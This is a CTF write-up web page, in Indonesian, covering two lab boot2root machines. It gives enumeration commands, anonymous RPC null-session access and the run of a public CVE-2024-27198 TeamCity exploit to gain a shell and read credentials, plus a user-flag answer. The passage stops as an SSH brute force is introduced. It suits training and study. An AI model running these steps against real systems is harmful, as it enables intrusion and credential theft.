@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="google-site-verification" content="rPvUCgYTOPryg6QXUsRcNaqgw7cfzujZZyi0ipJPLdM" />
+        <meta name="robots" content="noodp" />
+        <title>Hacktrace-Ranges CTF 2024 Quals Writeup [Full Boot2Root] - whyuhurtz&#39;s Blog</title><meta name="Description" content="I managed to solved 3 boot2root challenges, even if it&#39;s only user flag."><meta property="og:url" content="https://whyuhurtz.me/2024/08/hacktrace-ranges-ctf-2024-quals-writeup-full-boot2root/">
+  <meta property="og:site_name" content="whyuhurtz&#39;s Blog">
+  <meta property="og:title" content="Hacktrace-Ranges CTF 2024 Quals Writeup [Full Boot2Root]">
+  <meta property="og:description" content="I managed to solved 3 boot2root challenges, even if it&#39;s only user flag.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-08-18T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="National">
+    <meta property="article:tag" content="Boot2root">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hacktrace-Ranges CTF 2024 Quals Writeup [Full Boot2Root]">
+  <meta name="twitter:description" content="I managed to solved 3 boot2root challenges, even if it&#39;s only user flag.">
+<meta name="application-name" content="whyuhurtz&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="whyuhurtz&#39;s Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://whyuhurtz.me/2024/08/hacktrace-ranges-ctf-2024-quals-writeup-full-boot2root/" /><link rel="prev" href="https://whyuhurtz.me/2024/08/litctf-2024-quals-writeup/" /><link rel="next" href="https://whyuhurtz.me/2024/09/slashroot-ctf-8.0-quals-writeup/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hacktrace-Ranges CTF 2024 Quals Writeup [Full Boot2Root]",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/whyuhurtz.me\/2024\/08\/hacktrace-ranges-ctf-2024-quals-writeup-full-boot2root\/"
+        },"genre": "posts","keywords": "ctf, national, boot2root","wordcount":  1731 ,
+        "url": "https:\/\/whyuhurtz.me\/2024\/08\/hacktrace-ranges-ctf-2024-quals-writeup-full-boot2root\/","datePublished": "2024-08-18T00:00:00+00:00","dateModified": "2024-08-18T00:00:00+00:00","license": "\u0026copy; 2023-2025","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "whyuhurtz"
+            },"description": "I managed to solved 3 boot2root challenges, even if it's only user flag."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/achievements/"> Achievements </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/achievements/" title="">Achievements</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Hacktrace-Ranges CTF 2024 Quals Writeup [Full Boot2Root]</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/whyuhurtz" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>whyuhurtz</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-18">2024-08-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1731 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-rocket">1. Rocket</a>
+      <ul>
+        <li><a href="#detail-tantangan">Detail Tantangan</a></li>
+        <li><a href="#langkah-penyelesaian">Langkah Penyelesaian</a>
+          <ul>
+            <li><a href="#port--service-enumeration">Port &amp; Service Enumeration</a></li>
+            <li><a href="#rdp-enumeration">RDP Enumeration</a></li>
+            <li><a href="#rpc-enumeration">RPC Enumeration</a></li>
+            <li><a href="#http-port-8111-enumeration">HTTP Port 8111 Enumeration</a></li>
+          </ul>
+        </li>
+        <li><a href="#user-flag">User Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-poison-master">2. Poison Master</a>
+      <ul>
+        <li><a href="#detail-tantangan-1">Detail Tantangan</a></li>
+        <li><a href="#langkah-penyelesaian-1">Langkah Penyelesaian</a>
+          <ul>
+            <li><a href="#port--service-enumeration-1">Port &amp; Service Enumeration</a></li>
+            <li><a href="#rpc-enumeration-1">RPC Enumeration</a></li>
+            <li><a href="#smb-enumeration">SMB Enumeration</a></li>
+            <li><a href="#http-port-7765-enumeration">HTTP Port 7765 Enumeration</a></li>
+            <li><a href="#bruteforce-ssh-with-known-users">Bruteforce SSH with Known Users</a></li>
+            <li><a href="#remote-ssh-to-target-server">Remote SSH to Target Server</a></li>
+          </ul>
+        </li>
+        <li><a href="#user-flag-1">User Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-moonstone">3. Moonstone</a>
+      <ul>
+        <li><a href="#detail-tantangan-2">Detail Tantangan</a></li>
+        <li><a href="#langkah-penyelesaian-2">Langkah Penyelesaian</a>
+          <ul>
+            <li><a href="#port--service-enumeration-2">Port &amp; Service Enumeration</a></li>
+            <li><a href="#ftp-enumeration">FTP Enumeration</a></li>
+            <li><a href="#smb-enumeration-1">SMB Enumeration</a></li>
+            <li><a href="#rpc-enumeration-2">RPC Enumeration</a></li>
+            <li><a href="#finding-the-secrets">Finding The Secrets</a></li>
+            <li><a href="#gaining-access-w-php-reverse-shell">Gaining Access w/ PHP Reverse Shell</a></li>
+            <li><a href="#remote-ssh-to-target-server-1">Remote SSH to Target Server</a></li>
+          </ul>
+        </li>
+        <li><a href="#user-flag-2">User Flag</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content">I managed to solved 3 boot2root challenges, even if it&#39;s only user flag.
+<h1 id="1-rocket">1. Rocket</h1>
+<h2 id="detail-tantangan">Detail Tantangan</h2>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Level</strong></th>
+          <th>Easy</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Points</strong></td>
+          <td>30 (User) &amp; 70 (Root)</td>
+      </tr>
+      <tr>
+          <td><strong>Machine IP</strong></td>
+          <td>10.1.2.233</td>
+      </tr>
+      <tr>
+          <td><strong>Machine OS</strong></td>
+          <td>Windows 10</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="langkah-penyelesaian">Langkah Penyelesaian</h2>
+<h3 id="port--service-enumeration">Port &amp; Service Enumeration</h3>
+<ul>
+<li>Saya menggunakan tool <code>rustscan</code> untuk mempercepat proses port scanning.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rustscan -a 10.1.2.233 -r 1-65535 --scripts default <span class="p">|</span> tee -a output_scan_all_ports.txt</span></span></code></pre></div></div>
+<ul>
+<li>Beberapa port yang open dan interesting antara lain:
+<ul>
+<li><strong>445</strong> (SMB)</li>
+<li><strong>135</strong> (MSRPC)</li>
+<li><strong>139</strong> (RPC)</li>
+<li><strong>3389</strong> (RDP)</li>
+<li><strong>8111</strong> (HTTP)</li>
+</ul>
+</li>
+</ul>
+<h3 id="rdp-enumeration">RDP Enumeration</h3>
+<ul>
+<li>Hasil scan service pada port 3389 (RDP) menggunakan <code>nmap</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p <span class="m">3389</span> -sVC -v -oN output_scan_port_3389.txt 10.1.2.233</span></span></code></pre></div></div>
+<ul>
+<li>Tidak ada yang interesting untuk saat ini. Mungkin untuk <strong>Domain Name</strong> nanti berguna.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root1-01.png"
+        data-srcset="/images/hacktrace-ranges_boot2root1-01.png, /images/hacktrace-ranges_boot2root1-01.png 1.5x, /images/hacktrace-ranges_boot2root1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root1-01.png"
+        title="Rocket-01" width="641" height="781" /></p>
+<h3 id="rpc-enumeration">RPC Enumeration</h3>
+<ul>
+<li>Terdapat celah null session atau attacker dapat login sebagai anonymous.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rpcclient -U <span class="s2">&#34;&#34;</span> -N 10.1.2.233 -p <span class="m">139</span></span></span></code></pre></div></div>
+<ul>
+<li>Hasil enumerasi domain: <code>enumdomains</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rpcclient $&gt; enumdomains
+</span></span><span class="line"><span class="cl">name:<span class="o">[</span>LETHOS<span class="o">]</span> idx:<span class="o">[</span>0x0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">name:<span class="o">[</span>Builtin<span class="o">]</span> idx:<span class="o">[</span>0x1<span class="o">]</span></span></span></code></pre></div></div>
+<ul>
+<li>Hasil enumerasi shared folder: <code>netshareenumall</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rpcclient $&gt; netshareenumall
+</span></span><span class="line"><span class="cl">netname: print$
+</span></span><span class="line"><span class="cl">  remark: Printer Drivers
+</span></span><span class="line"><span class="cl">  path:   C:<span class="se">\\</span>var<span class="se">\\</span>lib<span class="se">\\</span>samba<span class="se">\\</span>printers
+</span></span><span class="line"><span class="cl">  password:
+</span></span><span class="line"><span class="cl">netname: IPC$
+</span></span><span class="line"><span class="cl">  remark: IPC Service <span class="o">(</span>lethos server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">  path:   C:<span class="se">\\</span>tmp
+</span></span><span class="line"><span class="cl">  password:</span></span></code></pre></div></div>
+<ul>
+<li>Tidak berhasil mendapatkan <code>enumdomusers</code>.</li>
+</ul>
+<h3 id="http-port-8111-enumeration">HTTP Port 8111 Enumeration</h3>
+<ul>
+<li>Hasil scan service pada port <strong>8111</strong> menggunakan <code>nmap</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p <span class="m">8111</span> -sVC -v -oN output_scan_port_8111.txt 10.1.2.233</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root1-02.png"
+        data-srcset="/images/hacktrace-ranges_boot2root1-02.png, /images/hacktrace-ranges_boot2root1-02.png 1.5x, /images/hacktrace-ranges_boot2root1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root1-02.png"
+        title="Rocket-02" width="926" height="866" /></p>
+<ul>
+<li>Setelah saya coba open port <strong>8111</strong> di web browser, terdapat info menarik yaitu tampil halaman login <strong>JetBrains TeamCity versi 2023.11.3</strong>.</li>
+<li>Tanpa pikir panjang, saya langsung mencari tau apakah versi tersebut ada CVE-nya atau tidak.</li>
+<li>Dari hasil pencarian, ditemukan bahwa <strong>JetBrains TeamCity versi 2023.11.3</strong> terdapat kerentanan <em><strong>Authentication Bypass to RCE</strong></em>, yang mana mengizinkan attacker bisa login tanpa menggunakan akun yang sah/terdaftar di sistem (lebih lengkapnya baca artikel ini: <a href="https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199%29" target="_blank" rel="noopener noreffer ">https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199)</a>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root1-03.png"
+        data-srcset="/images/hacktrace-ranges_boot2root1-03.png, /images/hacktrace-ranges_boot2root1-03.png 1.5x, /images/hacktrace-ranges_boot2root1-03.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root1-03.png"
+        title="Rocket-03" /></p>
+<ul>
+<li>Kemudian saya cari script POC yang mungkin orang lain pernah buat, dan ternyata saya menemukannya dari repo GitHub berikut: <a href="https://github.com/W01fh4cker/CVE-2024-27198-RCE" target="_blank" rel="noopener noreffer ">https://github.com/W01fh4cker/CVE-2024-27198-RCE</a>.</li>
+<li>Saya coba jalankan script tersebut menggunakan command:</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip3 install requests urllib3 faker
+</span></span><span class="line"><span class="cl">python3 CVE-2024-27198-RCE.py -t &lt;http://10.1.2.233:8111&gt;</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root1-04.png"
+        data-srcset="/images/hacktrace-ranges_boot2root1-04.png, /images/hacktrace-ranges_boot2root1-04.png 1.5x, /images/hacktrace-ranges_boot2root1-04.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root1-04.png"
+        title="Rocket-04" width="936" height="436" /></p>
+<ul>
+<li>Dan <strong>Alhamdulillah</strong>! saya berhasil mendapatkan powershellnya, lanjut ke pencarian kredensial untuk bisa melakukan RDP.</li>
+<li>Saya coba <code>ls</code> current directory dan menemukan sebuah file: <code>cred.txt</code> yang berisi username dan password.</li>
+<li>Tanpa pikir panjang saya langsung coba login RDP menggunakan tool bawaan Windows langsung.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root1-05.png"
+        data-srcset="/images/hacktrace-ranges_boot2root1-05.png, /images/hacktrace-ranges_boot2root1-05.png 1.5x, /images/hacktrace-ranges_boot2root1-05.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root1-05.png"
+        title="Rocket-05" width="531" height="323" /></p>
+<ul>
+<li>Terdapat sebuah file <code>user.txt</code> di <strong>Desktop</strong>, dan setelah saya buka ternyata berisikan sebuah flag user. <strong>GOTCHAA!!</strong>.</li>
+<li>Berikut POC setelah berhasil remote desktop ke mesin target Windows 10:</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root1-06.png"
+        data-srcset="/images/hacktrace-ranges_boot2root1-06.png, /images/hacktrace-ranges_boot2root1-06.png 1.5x, /images/hacktrace-ranges_boot2root1-06.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root1-06.png"
+        title="Rocket-06" /></p>
+<h2 id="user-flag">User Flag</h2>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>24ee7336f91a82fcab6bd8b1fd981d2a</strong></div>
+        </div>
+    </div>
+<hr>
+<h1 id="2-poison-master">2. Poison Master</h1>
+<h2 id="detail-tantangan-1">Detail Tantangan</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Level</th>
+          <th>Easy</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Points</td>
+          <td>30 (User) &amp; 70 (Root)</td>
+      </tr>
+      <tr>
+          <td>Machine IP</td>
+          <td>10.1.2.234</td>
+      </tr>
+      <tr>
+          <td>Machine OS</td>
+          <td>Linux</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="langkah-penyelesaian-1">Langkah Penyelesaian</h2>
+<h3 id="port--service-enumeration-1">Port &amp; Service Enumeration</h3>
+<ul>
+<li>Hasil scan port menggunakan <code>rustscan</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rustscan -a 10.1.2.234 -r 1-65535 --scripts default <span class="p">|</span> tee -a output_scan_all_ports.txt</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-01.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-01.png, /images/hacktrace-ranges_boot2root2-01.png 1.5x, /images/hacktrace-ranges_boot2root2-01.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-01.png"
+        title="Poison Master-01" width="404" height="139" /></p>
+<h3 id="rpc-enumeration-1">RPC Enumeration</h3>
+<ul>
+<li>Terdapat celah null session yang berarti bisa dimanfaatkan untuk login sebagai <code>anonymous</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rpcclient -U <span class="s2">&#34;&#34;</span> -N 10.1.2.234 -p <span class="m">139</span></span></span></code></pre></div></div>
+<ul>
+<li>Hasil enumerasi list user: <code>enumdomusers</code> tidak tampil informasi apa-apa.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-02.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-02.png, /images/hacktrace-ranges_boot2root2-02.png 1.5x, /images/hacktrace-ranges_boot2root2-02.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-02.png"
+        title="Poison Master-02" width="381" height="76" /></p>
+<ul>
+<li>Hasil enumerasi list group juga tidak menampilkan informasi apa pun: <code>enumdomgroups</code>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-03.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-03.png, /images/hacktrace-ranges_boot2root2-03.png 1.5x, /images/hacktrace-ranges_boot2root2-03.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-03.png"
+        title="Poison Master-03" width="305" height="54" /></p>
+<ul>
+<li>Hasil enumerasi list domain: <code>enumdomains</code>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-04.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-04.png, /images/hacktrace-ranges_boot2root2-04.png 1.5x, /images/hacktrace-ranges_boot2root2-04.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-04.png"
+        title="Poison Master-04" width="286" height="76" /></p>
+<ul>
+<li>Hasil enumerasi shared folder: <code>netshareenumall</code>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-05.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-05.png, /images/hacktrace-ranges_boot2root2-05.png 1.5x, /images/hacktrace-ranges_boot2root2-05.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-05.png"
+        title="Poison Master-05" width="671" height="226" /></p>
+<ul>
+<li>Dapat dilihat pada gambar di bawah ini, list SID yang tersedia hanya berjumlah 6 saja.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-06.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-06.png, /images/hacktrace-ranges_boot2root2-06.png 1.5x, /images/hacktrace-ranges_boot2root2-06.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-06.png"
+        title="Poison Master-06" width="389" height="255" /></p>
+<ul>
+<li>Tetapi, ketika saya coba enumerasi secara otomatis menggunakan: <code>enum4linux</code> muncul SID baru yaitu: <strong>S-1-22-1</strong> yang di dalamnya terdapat 2 user baru:
+<ul>
+<li><strong>ubmaj</strong>, dan</li>
+<li><strong>jambu</strong></li>
+</ul>
+</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">enum4linux 10.1.2.234</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-07.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-07.png, /images/hacktrace-ranges_boot2root2-07.png 1.5x, /images/hacktrace-ranges_boot2root2-07.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-07.png"
+        title="Poison Master-07" width="830" height="129" /></p>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<ul>
+<li>Tidak ada folder apa pun di net share <code>IPC$</code>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-08.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-08.png, /images/hacktrace-ranges_boot2root2-08.png 1.5x, /images/hacktrace-ranges_boot2root2-08.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-08.png"
+        title="Poison Master-08" width="475" height="131" /></p>
+<ul>
+<li>Not interesting for now.</li>
+</ul>
+<h3 id="http-port-7765-enumeration">HTTP Port 7765 Enumeration</h3>
+<ul>
+<li>Setelah saya coba visit port <strong>7765</strong> di web browser, muncul tampilan Apache2 Default Web Page, tapi setelah saya coba cari-cari CVE-nya atau informasi terkait, hasilnya nihil. Jadi, saya pikir ini hanya <em><strong>rabbithole</strong></em> aja.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/hacktrace-ranges_boot2root2-09.png"
+        data-srcset="/images/hacktrace-ranges_boot2root2-09.png, /images/hacktrace-ranges_boot2root2-09.png 1.5x, /images/hacktrace-ranges_boot2root2-09.png 2x"
+        data-sizes="auto"
+        alt="/images/hacktrace-ranges_boot2root2-09.png"
+        title="Poison Master-09" width="1517" height="355" /></p>
+<h3 id="bruteforce-ssh-with-known-users">Bruteforce SSH with Known Users</h3>
+<ul>
+<li>Karena stuck dan minim informasi, saya coba bruteforce service SSH menggunakan list user yang disembunyikan tadi, yaitu: <code>ubmaj</code> dan <code>jambu</code> dengan passwordnya menggunakan wordlist: <code>rockyou.txt</code>.</li>
+<li>Berikut command hydra untuk bruteforce-nya.</li>
+</ul>
